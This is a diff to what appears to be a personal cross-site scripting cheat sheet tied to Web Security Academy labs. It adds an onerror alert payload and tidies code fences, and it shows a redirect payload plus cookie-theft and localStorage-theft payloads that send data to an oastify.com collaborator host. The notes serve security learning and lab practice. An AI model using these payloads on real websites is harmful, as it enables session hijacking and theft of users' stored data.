@@ -27,8 +27,12 @@ https://site.com/search?q=
 - Setup output encoding to only return certain symbols
 # Uses
 - Evasion techniques: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
-### Redirect
+### Classic OnError
+```js
+<img src="x" onerror="alert('XSS')">
 ```
+### Redirect
+```js
 <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
 ```
 ### [[WebSocket Hijacking]]
@@ -46,10 +50,11 @@ ws.onmessage = function (evt) {
 
 ```
 ### [[Cookies|Cookie]] Theft
-```
+```js
 <script>var i=new Image;i.src="http://...oastify.com/?"+document.cookie;</script>
-**```
+```
 ### [[Javascript Local Storage]]
+```
 ```
 <script>var i=new Image;i.src="http://...oastify.com/?"+localStorage.getItem("keyname");</script>
 ```
